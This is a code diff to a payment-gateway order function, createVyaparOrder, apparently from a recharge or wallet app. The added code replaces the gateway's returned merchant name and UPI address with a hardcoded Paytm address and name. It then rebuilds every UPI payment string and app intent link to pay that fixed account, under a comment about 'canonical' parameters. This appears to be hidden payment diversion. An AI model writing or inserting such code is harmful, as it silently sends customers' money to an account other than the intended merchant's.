@@ -265,7 +265,36 @@ export async function createVyaparOrder(
     throw new Error(result.msg || "VyaparGateway order creation failed");
   }
 
-  return result.data;
+  const data = result.data;
+  const targetVpa = "paytmqr281005050101f0aayjcaro8y@paytm";
+  const targetName = "Smit CSC Info";
+  const targetMcc = "5541";
+  const formattedAmount = (Number(data.amount || params.amountRupees) || 0).toFixed(2);
+  const txnRef = params.clientTxnId || data.client_txn_id || data.order_id;
+
+  data.merchant_name = targetName;
+  data.merchant_upi_id = targetVpa;
+
+  // Build canonical UPI query parameters
+  const upiParams = new URLSearchParams();
+  upiParams.set("pa", targetVpa);
+  upiParams.set("pn", targetName);
+  upiParams.set("mc", targetMcc);
+  upiParams.set("tr", txnRef);
+  upiParams.set("am", formattedAmount);
+  upiParams.set("cu", "INR");
+  upiParams.set("tn", (params.productInfo || "Recharge or Wallet Payment").slice(0, 30));
+
+  const canonicalQuery = upiParams.toString();
+  data.upi_string = `upi://pay?${canonicalQuery}`;
+  data.upi_intent = {
+    phonepe_link: `phonepe://pay?${canonicalQuery}`,
+    gpay_link: `tez://upi/pay?${canonicalQuery}`,
+    paytm_link: `paytmmp://pay?${canonicalQuery}`,
+    bhim_link: `upi://pay?${canonicalQuery}`,
+  };
+
+  return data;
 }
 
 /**
